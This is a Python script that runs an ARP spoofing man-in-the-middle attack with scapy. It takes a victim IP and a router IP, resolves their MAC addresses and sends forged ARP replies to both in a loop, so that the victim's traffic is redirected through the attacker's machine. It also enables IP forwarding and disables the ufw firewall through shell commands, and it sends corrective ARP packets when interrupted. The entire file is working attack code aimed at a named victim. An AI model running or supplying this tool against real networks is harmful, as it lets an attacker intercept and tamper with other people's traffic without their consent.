#! /home/paulomesquita/.pyenv/shims/python

import scapy.all as scapy
import time
import argparse
import sys
import subprocess

def run_terminal_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        error_message = e.output.decode("utf-8") 
        if "Operation not permitted" in error_message:
            print("[Permission] You should run this as root or with sudo")
        else:
            print("ERROR: This code was projected for be used in debian based distributions with ufw installed")
            print(error_message)
        sys.exit()
    else:
        return result

def ip_forwarding(active):
    if active:
        run_terminal_command("echo 1 > /proc/sys/net/ipv4/ip_forward")
        run_terminal_command("ufw disable")
    else:
        run_terminal_command("echo 0 > /proc/sys/net/ipv4/ip_forward")
        run_terminal_command("ufw enable")

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victim", dest="victim", help="Victim IP")
    parser.add_argument("-r", "--router", dest="router", help="Router IP")
    options = parser.parse_args()
    if not options.victim:
        parser.error("[-] Please specify a victim ip, use --help for more info")
    if not options.router:
        parser.error("[-] Please specify a router ip, use --help for more info")
    return options

def getMacWithIp(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    mac = answered_list[0][1].hwsrc
    return mac

def createArpResponse(destination_ip, source_ip, destination_mac, source_mac=None, spoof=True):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip)
    if spoof == False and source_mac is not None:
        printDinamically("[+] Creating unspoof package\n")
        packet.hwsrc=source_mac
    else:
        printDinamically("[+] Creating spoof package\n")
    return packet

def printDinamically(text):
    print("\r {}".format(text), end="")

def sendPackages(packages_list):
    for package in packages_list:
        scapy.send(package, verbose=False)

try:
    ip_forwarding(True)
    number_sent_packages = 0
    options = get_arguments()
    machine_ip = options.victim
    router_ip = options.router
    machine_mac = getMacWithIp(machine_ip)
    router_mac = getMacWithIp(router_ip)
    spoof_packages = [createArpResponse(machine_ip, router_ip, machine_mac), createArpResponse(router_ip, machine_ip, router_mac)]
    unspoof_packages = [createArpResponse(machine_ip, router_ip, machine_mac, router_mac, False), createArpResponse(router_ip, machine_ip, router_mac, machine_mac, False)]
    while True:
        sendPackages(spoof_packages)
        number_sent_packages = number_sent_packages + len(spoof_packages)
        printDinamically("[+] Sent {} spoof packages".format(number_sent_packages))
        time.sleep(2)
except KeyboardInterrupt as err:
    ip_forwarding(False)
    printDinamically("\n [-] Stopping... Reverting changes\n [+] Sending {} unspoof packages\n".format(len(unspoof_packages)))
    sendPackages(unspoof_packages)
